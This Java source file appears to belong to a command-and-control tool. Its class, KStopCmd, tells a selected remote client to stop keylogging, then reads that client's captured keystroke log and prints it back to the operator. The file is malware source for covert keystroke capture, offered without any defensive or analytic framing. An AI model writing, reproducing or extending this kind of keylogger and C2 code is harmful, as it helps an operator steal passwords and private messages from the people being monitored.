package commands;

import server.CommandServer;
import tools.KeyLoggerReader;
import tools.ParsedCommand;

/**
 * Notify client to stop keylogging and prints the interpreted log file
 * 
 * @author Yohan Chalier
 *
 */
public class KStopCmd extends ServerCommand {

	public KStopCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {		
		c2.getClients().get(c2.getCurrentClient()).stackCmd("KSTOP");
		
		KeyLoggerReader reader = new KeyLoggerReader(
				c2.getCurrentClient() + "_key.log");
		
		return "Stoping keylogger for client " + c2.getCurrentClient()
				+ "\n-----BEGIN KEYLOG OUTPUT-----\n"
				+ reader.toString()
				+ "\n-----END KEYLOG OUTPUT-----";
	}

}
